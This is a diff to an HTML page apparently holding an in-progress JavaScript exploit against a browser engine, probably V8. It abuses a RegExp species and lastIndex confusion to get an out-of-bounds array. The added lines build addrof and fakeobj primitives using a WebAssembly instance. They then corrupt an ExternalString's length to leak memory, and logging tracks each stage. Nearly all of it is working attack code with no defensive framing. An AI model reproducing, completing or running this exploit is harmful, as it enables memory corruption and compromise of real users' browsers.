@@ -1,4 +1,5 @@
-<!doctype html><html><head><meta charset="utf-8"><title>P27</title></head>
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P27</title></head>
 <body><pre id="out">Running...</pre>
 <script>
 "use strict";
@@ -11,16 +12,15 @@ function f2i(f){f64[0]=f;return u64[0];}
 function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
 function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
 const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe;
-const PINS=[0x1080011,0x1100011];
-// Use UNIQUE sentinel: 1337.133713371337 = 0x4094e488ec2873b9
-const SENTINEL=0x4094e488ec2873b9n;
-const dblA=new Array(0x8000);
-dblA[0]=1337.133713371337; // unique sentinel
-for(let i=1;i<dblA.length;i++)dblA[i]=1337.133713371337+i*0.001;
-const objB=new Array(0x8000);for(let i=0;i<objB.length;i++)objB[i]=null;
+const PINS=[0x1080011];
+const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;
+const marker={mmm:1};
+const objB=new Array(0x8000);
+objB[0]=marker;objB[1]=marker;objB[2]=marker;objB[3]=marker;
 const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
   new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
-objB[0]=wasmI;
+objB[4]=wasmI;
+const victim=[1.22,1.33,1.44];
 const re=/(?:)/;
 const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
 const c0=w2f(DMAP,EMPTY);
@@ -44,48 +44,83 @@ const m=re.lastIndex;
 log("T: "+typeof m+" A="+Array.isArray(m));
 if(Array.isArray(m)){
   log("L: "+m.length);
-  log("M0: "+f2i(m[0]).toString(16));
-  // Scan pages 1+2 for unique sentinel
-  let found=-1;
-  // Page 1: m[0..0x7FF0]
-  for(let k=0;k<0x7FF0;k++){
-    try{if(f2i(m[k])===SENTINEL){found=k;break;}}catch(e){break;}
-  }
-  // Page 2 if not in page 1: m[0x8000..0xFFF0]
-  if(found<0){
-    try{f2i(m[0x8000]);}catch(e){log("PG2_NA");} // test accessibility
-    if(found<0){
-      for(let k=0x8000;k<0xFFF0;k++){
-        try{if(f2i(m[k])===SENTINEL){found=k;break;}}catch(e){log("PG2_END@"+k.toString(16));break;}
+  const d=[];
+  for(let k=0;k<8;k++){try{d.push(f2i(m[k]).toString(16));}catch(e){d.push("E");break;}}
+  log("H0: "+d.join(","));
+  // Also probe dblA: if m[k] were dblA, m[0] would have been 10.125 (it's not)
+  // Scan SAFE window m[0..0x7000] for marker pattern (lo==hi odd pairs)
+  let OB=-1;
+  for(let k=0;k<0x7000;k++){
+    try{
+      const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
+      if(lo===hi&&(lo&1n)===1n&&lo>0x1000n&&lo<0x2000000n){
+        objB[5]=marker;
+        if((f2i(m[k])>>32n)===lo){OB=k;break;}
       }
-    }
+    }catch(e){log("STOP:"+k.toString(16));break;}
   }
-  if(found>=0){
-    log("PD@"+found.toString(16));
-    // Verify: dblA[1] should be ~1337.134713371337
-    const d1=m[found+1];
-    const d2=m[found+2];
-    log("D1:"+d1+" D2:"+d2);
-    // If verified (d1 ≈ 1337.134), we have pinnedDoubles cage addr!
-    if(Math.abs(d1-1337.134713371337)<0.01){
-      log("VERIFIED_PD");
-      // pinnedDoubles FDA start = cage + 0x1080018 + (found-1)*8
-      // (found-1 because FDA header is 1 QWORD before data[0])
-      const fdaOff=0x1080018+(found-1)*8;
-      log("FDA_OFF: "+fdaOff.toString(16));
-      // addrof: write wasmI to dblA[0], read raw via m[found]
-      dblA[0]=wasmI;
-      const rawAddr=f2i(m[found]);
-      log("WASM_RAW: "+rawAddr.toString(16));
-      const wasmLo=Number(rawAddr&0xffffffffn);
-      log("WASM_CAGE: "+wasmLo.toString(16));
-      dblA[0]=1337.133713371337; // restore
-    }
-  }else{
-    log("PD_NOT_FOUND");
-  }
+  if(OB>=0){
+    log("OB:"+OB.toString(16));
+    objB[4]=wasmI;
+    log("WASM:"+(f2i(m[OB+2])&0xffffffffn).toString(16));
+    objB[4]=marker;
+    // FAKEOBJ roundtrip ONLY (no fake array, no ES)
+    objB[4]=wasmI;
+    const raw=f2i(m[OB+2]);
+    m[OB+2]=i2f(raw);
+    const fo=objB[4];
+    const foOk=(!!fo&&!!fo.exports&&fo.exports.f()===42);
+    objB[4]=marker;
+    const wasmAddr=f2i(m[OB+2])&0xffffffffn;
+    // === ExternalString direct length corruption via master ===
+    // allocations first
+    const dec=new TextDecoder("windows-1252");
+    const eb=new Uint8Array(0x40);eb.fill(0x41);
+    const es=dec.decode(eb);
+    objB[4]=es;
+    const esAddr=f2i(m[OB+2])&0xffffffffn; // tagged
+    objB[4]=marker;
+    // target qword at (esAddr-1)+8 ; master data base = 0x1080018
+    const BASEN=0x1080018n;
+    const tq=(esAddr-1n)+8n;
+    const off=tq-BASEN; // byte offset
+    let lr="",nl="E",leak="";
+    try{
+      if((off&7n)===0n){
+        const idx=Number(off>>3n);
+        const v=f2i(m[idx]);
+        lr="al:"+v.toString(16);
+        m[idx]=i2f((v&0xffffffff00000000n)|0x01200000n);
+      }else{
+        // 4-mod-8: qword spans m[i] hi and m[i+1] lo
+        const offb=off-4n;
+        const idx=Number(offb>>3n);
+        const a=f2i(m[idx]);   // [slot2i|slot2i+1] — target lo in a.hi
+        const b=f2i(m[idx+1]); // target hi in b.lo
+        lr="un:"+(a>>32n).toString(16)+":"+(b&0xffffffffn).toString(16);
+        // new qword = [0x01200000 | orig_hi]
+        m[idx]=i2f((0x01200000n<<32n)|(a&0xffffffffn));
+        m[idx+1]=i2f((b>>32n<<32n)|(b&0xffffffffn)); // keep b.hi, b.lo unchanged? NO —
+        // b.lo = orig_hi must stay; we didn't change it. Restore b fully:
+        m[idx+1]=i2f(b);
+      }
+      nl=es.length.toString(16);
+      if(es.length===0x01200000){
+        let s="";
+        for(let j2=0;j2<24;j2++){s+=es.charCodeAt(0x1000+j2).toString(16).padStart(2,"0");}
+        leak=s;
+      }
+    }catch(e){lr="E:"+e.message;}
+    log("FO:"+foOk);
+    log("ES:"+esAddr.toString(16));
+    log("LR:"+lr);
+    log("NL:"+nl);
+    if(leak)log("LEAK:"+leak);
+    log("CHAIN_DONE");
+  }else{log("MARKER_MISS");}
   log("W: "+wasmI.exports.f());
-}else{log("NA");}
+}else if(typeof m==="number"){log("N: "+f2i(m).toString(16));}
+else{log("OBJ:"+typeof m);}
 }catch(e){log("E: "+e.message);}
 log("=== DONE ===");
 </script></body></html>
